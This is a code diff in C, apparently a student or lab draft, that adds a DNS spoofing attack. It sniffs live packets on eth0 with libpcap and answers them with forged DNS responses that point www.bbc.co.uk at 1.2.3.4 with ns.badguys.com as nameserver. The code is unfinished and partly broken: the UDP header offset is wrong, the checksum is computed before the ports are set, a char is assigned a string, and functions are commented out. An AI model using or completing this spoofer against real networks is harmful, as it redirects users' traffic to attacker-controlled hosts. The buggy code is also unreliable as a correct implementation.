@@ -12,11 +12,21 @@
 
 
 #define BUFSIZE 1500;
+void spoof_DNS_reply(struct ipheader* ip);
+
+void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+{
+printf("captured a dns packet\n");
+  struct ethheader *eth = (struct ethheader *)packet;
+  if (ntohs(eth->ether_type) == 0x0800) 
+      spoof_DNS_reply((struct ipheader*)(packet + SIZE_ETHERNET));
+};
 
 int main()
 {
   pcap_t *handle;
   char errbuf[PCAP_ERRBUF_SIZE];
+  printf("buffsize %i\n",BUFSIZ);
   struct bpf_program fp;
   //char filter_exp[] = "port 23";
   // Don't sniff the packet from/to the specified ether address
@@ -26,7 +36,9 @@ int main()
 
   //Open live pcap session on NIC with name eth0
   handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);	  
-
+  printf("handle is %p\n",handle);
+  printf("errbuf is %s\n",errbuf);
+  
   //Compile filter_exp into BPF psuedo-code
   pcap_compile(handle, &fp, filter_exp, 0, net); 
 
@@ -36,24 +48,58 @@ int main()
   return 0;
 }
 
-void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
+void spoof_DNS_reply(struct ipheader* ip)
 {
-  struct ethheader *eth = (struct ethheader *)packet;
-  if (ntohs(eth->ether_type) == 0x0800) 
-      process_ip((struct ipheader*)(packet + SIZE_ETHERNET));
-};
+    int ip_header_len = ip->iph_ihl * 4;
+    const char buffer[1500];
+
+    struct udpheader* udp = (struct udpheader *) ((u_char *)ip + ip_header_len);
+
+    // make a copy from original packet to buffer(faked packet)
+    memset((char*)buffer, 0, 1500);
+    memcpy((char*)buffer, ip, ntohs(ip->iph_len));
+    struct ipheader   * newip    = (struct ipheader *) buffer;
+    struct udpheader * newudp = (struct udpheader *) 
+                                  ((u_char *)buffer + ip_header_len);
+
+    // Construct IP: swap src and dest in faked ICMP packet
+    newip->iph_sourceip = ip->iph_destip;
+    newip->iph_destip = ip->iph_sourceip;
+    newip->iph_ttl = 20;
+    newip->iph_protocol = UDP_PROTOCOL; 
+
+    
+
+    //Calculate the checksum for integrity. ICMP checksum includes the data 
+    newudp->udp_sum = 0; // Set it to zero first
+    newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
+    newudp->udp_sport = udp->udp_dport;
+    newudp->udp_dport = udp->udp_sport;
+
+    //DNS bit here
+    int udp_header_len = ip->iph_ihl * 4;
+    struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + udp_header_len);
+    unsigned short dnsLength = construct_dns_reply(dns);
+
+    send_raw_ip_packet(newip);
+}
 
 
 /*Need to dynamically access eth# of attacking machine*/
-string get_eth()
+/*string get_eth()
 {
 
-}
+}*/
 
 /*Construct DNS Header and Records. Return the size (Header + Records)*/
-unsigned short construct_dns_reply(char *buffer)
+unsigned short construct_dns_reply(dnsheader *dns)
 {
-	struct dnsheader *dns = (struct dnsheader *) buffer;
+	char TARGET_DOMAIN[] = "www.bbc.co.uk";
+	char ANSWER_IPADDR[] = "1.2.3.4";
+	char NS_SERVER[] = "ns.badguys.com";
+	char NS_IPADDR = "1.2.3.5";
+
+	//struct dnsheader *dns = (struct dnsheader *) buffer;
 
 	//construct the DNS header:
 	dns->flags=htons(0x8400); //Flag = response; this is a DNS response
@@ -82,7 +128,7 @@ unsigned short construct_dns_reply(char *buffer)
 /*Construct an "A" record, and return the total size of the record.
 If name is NULL, use the offset parameter to construct the "name" field.
 If name is not NULL, copy it to the "name" field, and ignore the offset parameter.*/
-unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
+/*unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
 {
 	char *p = buffer;
 
@@ -110,4 +156,4 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 
 	return (p-buffer);
 
-}
+}*/
